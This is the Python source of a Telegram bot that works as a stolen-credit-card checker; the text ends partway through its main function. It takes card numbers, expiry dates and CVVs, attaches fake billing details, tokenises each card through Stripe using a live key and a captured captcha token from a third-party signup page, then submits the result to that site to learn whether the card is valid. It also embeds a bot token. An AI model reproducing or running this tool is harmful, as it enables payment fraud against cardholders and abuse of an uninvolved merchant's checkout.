import time
import random
import string
import requests
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

# Function to generate a random email
def generate_random_email():
    letters = string.ascii_lowercase
    email = ''.join(random.choice(letters) for i in range(10))
    return f"{email}@gmail.com"

# Function to check credit card
def check_credit_card(card_info, pm_value):
    email = generate_random_email()
    name = "John Doe"
    phone = "(314) 474-6658"

    card_details = card_info.split('|')
    if len(card_details) == 4:
        number, exp_month, exp_year, cvc = card_details
    else:
        number, exp_month, exp_year, cvc = card_info.split('/')

    exp_year = exp_year.zfill(4)  # Ensure year is 4 digits

    data = {
        "type": "card",
        "billing_details[email]": email,
        "billing_details[name]": name,
        "billing_details[phone]": phone,
        "card[number]": number,
        "card[cvc]": cvc,
        "card[exp_month]": exp_month,
        "card[exp_year]": exp_year,
        "guid": "df1cb213-3b8d-40b5-861d-b78e6fbb086a",
        "muid": "d65fe94e-d022-4554-9add-09e6aa20fc9c",
        "sid": "07be667a-e9c7-454b-bab4-1c1123b2e51b",
        "payment_user_agent": "stripe.js/9e39ef88d1; stripe-js-v3/9e39ef88d1; card-element",
        "referrer": "https://app.theruletool.com",
        "time_on_page": 32574,
        "key": "pk_live_IEQsNdUrbZuQsRHI0yPFlzwM00D623ymrA",
        "radar_options[hcaptcha_token]": "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiVmdQZFJwRjhFUjhuU2t6V2h6bjdtZklPNzliOGZJVFBpcnFoUTJXQWJtRG4rSEFHNVQwcTVoZFU2WlRlVDZ6NGNGMEUrdWpWbWVRbnVkWVBueEM1R0pGNEZLdU44Y2crcHBpZ3Uza00zNFpxMUdFWnV2eEpnY2pJeVFUTlBrR3VBVVI0anArb3R5RTdsMDJtVjZ0SFpkbXJvSEs1QVBDY3BOSVMwdFZSMUk2cFRtS3RDTUtKZEJNSlp3VVdHc1pseVlwcEsxYkVyampjUFVSTk9sK1RuUUZsbTROY0ZtNkRGT0trT0VaQVZCNERjbG45RDE4RGU1b1M5MlYxMXZyUWx6bTYvdXRaRDhGRTV4VGQyY01CbXR3WjlUclBwNjBsaXREcC8xbmxRSlNqaG93ekZSM1lzNkpZVFozRTlHTENZL3lseXNXclFaZE10M2FyNnd0RkhmNXZvUWI5UjZkb3FmYUNUT0c1b1M0MjluYzlDZmF4MVpuRTMzenJOdlZNQmFxUERxQ2VGb3Vmc2FBTlhiNnAwbXIwa0Zib3pCZ1NuM0dyaWdvVC9zbDIzSDQvekt2SWtpL0s0cTVhdG5XZXNjcVprMmJwU0hLS0IwTUUvT21Oc1ZEVWdGNUpvNEhKb0wzdlZhaSs3WWVZMTVnOFNFUElVNERKVlppTmMzQ2tKWFlDSWI3NjJmdzUyaHdWWjRWalBtdElZZXM3R0loWUJxRjJJazRLZXl2ME8wZ1JOME5MOXUvU2orWFg4SzcrVjVYMXBzdkJWb1BKS1RYWjI0SHlpYkVUQUtoNEduZml2UEVWcnZtdC83N2ZmakhYUzhCck4wc2dzWkhqUDVKZzN0ZkxWZ2N0SjR5WmxkdHVRNHV3VnB4WGZocjQ3K3hOWjBjU0hVbVZYNDBMelBwOUpMa1NCUDl3WjhlTHZlQ2VYMHMzTVd5YjZ0eUgwU3o0c01xZEJQeGJjTjVCaVRyQ0JSNmcvaG8zSVluSjVIWGF6dmJVL2NxOVFndHVlLzNOVEgxR3BWc0xWaXdVaDBPQUVIS3Q1UXBDTFZEZlQvenNNb2Z1WnFuSlcvakxXVUxaNkxOTjQxQkg4eXBFSHZ0SlVhSlpMb2J1N3dVcE5KNWVRV0J2cVpnaUJnRE5NclFCUm8xUGhtdFE5aFZXYmpMRTBHRmM1ZXFsd3JGYzMwR1Z3amlwcTBYb2lvOWRXNCtNT2xpakZkdlRGNytSRFRqSmJseWlLSmpBVVp2NjVRT2txMkFNMzVRcjFIMElvdW5mVmJuZFZLaVlLMHpGK09tSWUwdEVHN0k4T2pzZFR3a0hJSmh6SlVrZ081Q0Z1YmJ5dWRnNVc0ZDR3OEk3TlhUdk1MYzNpOE9WVnFOc09oWVVSMnprRWxIK0NLNFduWEtFTzBGcmlCSjhKdTBHME9ES0NlS1EvU1hxa2hPdXhxazRtd2NxL25QVm41bnI0Rnk2QmRkTlQzYS81K3BIZWZPSlkwbE9hL0RyV1FxcnRRYVg4NXFqampZeUpETVhxeFJPcm9YSngvNm9iRHYyTW01eVdGamFtZEx3TWJ2NG1NVVFlYnRhUi9vYzQ2bUczS2tMYVNjb2o0MVpuRWdvSnBIRFBvMXZrSUVRRngxTG12b3BiRUtmYnAxWmdrYWFUcWxkek84cjRORGc3SWsyRkJ5K3VINERBb1FvMWNsakdVYm81b2ZIbFM4Q2tIQXZmQ3J2VXpHVGtOb1UxTW1jaE41Mnlva1kra0JJUjNrdUpOUWVlZEhVbHRQTUlNcHY5STJzMmIxUndsSExCRHZNWnQyd1F5b3VyNDZRMUt0bTZmNlZqdEZOVjM5dWJWZjBReVYwMWtESzZtbTB5Y0MzTThTeWlrUXljODdheUlRQysya3RyMDA0d2JqM3g0Qnk2UVA2V0JzeDNyT09ZQUxubTVLYzVkaFZmemtsOGlCT3IzK2xpSStyUCtBQW9IWGYzUXlIOXEyK3BTRExnNEw1YkpRYUhENmtEN0FxeVpJVjRENFZPTUNwZ2JqVW5yOTlyKzJ4bENCQzdjZW1QbGsxZ3BCRTZveXVSN2lZdVRSVFQwZnpIQUVGTGFZekptM1lVRERxNlBGREdqRmpiczEyYzJ6SWpWVWw1NE9PSjhBdmVpRytQR2hJR0FpUTdsQTdVbHd3S1dNVkpqdS9rK3M1TXkycEptUHpFZldSaHBEQXYxVTlPRzhVTFZBeEVOWkp4MEt3eGJ6d3kwVnFvdWtVSkFZSXBUVXhwZitvT1VJS2ZheEtBYWxCTGg2VkdrMnlZWmVJTE83YVIrbUljUW1WT3lRanEzb0RMM0lmU2tYRUhqOW5Kbkx6MEJwaGQ1MEVueG9CcitZQldKNUhPRHFCVUZQUGN2Y3RqWkkyZExzV0h6TU9UK3QwL0tqOVJZajJHeEhET09BQXk4V2taeVN0bVhDS1o3anJ2NC9MSVZpRHBaMU1rVHFNM1BtWVhyUllFZGJUKzdYaEIxY2tVQnVNeElJL2Q2azBOY1AyTytFaG15TTZoZzViZU9PTXJCYlE4OTBReUMxc2plNzVWcjExUDBGb1E5emVhUjVCcFQ0WjNFeVEyNjBaRG1hYjhTcWZ5bkw2NTh1NHhGb1Z5eWs4YVVzOHF2Z0dpK3M3Vzh5K0lmV3JmcjVXempXVlg4ZC9LaGNiQjdVMDdKYjh0ZXBBS2x4ZVlSSXY3cSswWTFCRm90WEo0M2Z5NytrYzNDVzFxUnFBcnBrVFlGZXNONVB3NmVna2FsRDgwVVl1U1UvaUVlUmV3VlVnY0xqMXUwVXdWWFI5ZjBhRFdCMURiWm9rRnhNMnZzN2FLUE9VZVMrY05GaDFkWGpEeFNERTZaUDY3Z2xFRFBHVUFtRTBrQT09IiwiZXhwIjoxNzQ3MDU2NzY0LCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiMjRlMzgzYjkiLCJwZCI6MCwiY2RhdGEiOiJ1TjJNM2duZ0pLQi84dHlsV25zbGdEeGt1ZDVTNk5rWEZOTytrbkI2dzREV1ZySFBPN2VwK2tIYTZFZ29lbk5oS0xoZmpWSEJnWTFmRFN0cnVTclRXMkUxMDBoZHhVZ1FqZVExT3FnR1lCOStXeGZxMmJNZko2bTJHcjBvWGd6bGxuT3lka0xDTllhK0F6M2JHM0hMclpuajV3M3dqSmxKVDBLYzJIa3BjaWVBYnJuR1V4dDNVV0UzazROVU1xcHVNK0lqVUlNZ21jNERnc2E1In0."
    }

    headers = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.9",
        "content-length": "271",
        "content-type": "text/plain;charset=UTF-8",
        "origin": "https://app.theruletool.com",
        "referer": "https://app.theruletool.com/signup",
        "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "Windows",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
    }

    response = requests.post("https://api.stripe.com/v1/payment_methods", data=data, headers=headers)
    pm_value = response.json().get("id")

    final_url = "https://app.theruletool.com/signup/create"
    final_headers = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.9",
        "content-length": "271",
        "content-type": "text/plain;charset=UTF-8",
        "origin": "https://app.theruletool.com",
        "referer": "https://app.theruletool.com/signup",
        "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "Windows",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
    }

    final_data = {
        "pm": pm_value
    }

    final_response = requests.post(final_url, json=final_data, headers=final_headers)
    return final_response.json()

# Command handler for /start
def start(update: Update, context: CallbackContext):
    update.message.reply_text("Please provide credit card details in the following format:\nCC|MM|YY|CVV\nCC|MM|YYYY|CVV\nCC/MM/YY/CVV\nCC/MM/YYYY/CVV")

# Command handler for /stop
def stop(update: Update, context: CallbackContext):
    context.user_data['stop_checking'] = True
    update.message.reply_text("Stopping credit card checking.")

# Message handler for credit card details
def handle_message(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if 'stop_checking' in context.user_data and context.user_data['stop_checking']:
        context.user_data['stop_checking'] = False
        update.message.reply_text("Checking stopped.")
        return

    card_details = update.message.text
    cards = card_details.split('\n')
    for card in cards:
        if 'stop_checking' in context.user_data and context.user_data['stop_checking']:
            break
        response = check_credit_card(card, None)
        update.message.reply_text(f"Response for card {card}: {response}")
        time.sleep(15)

# Main function to start the bot
def main():
    updater = Updater("7621706011:AAE8N5F-uz1CNQ2T4QrXqKP7sTxuSeM-YgE", use_context=True)
    dp = updater.dispatcher
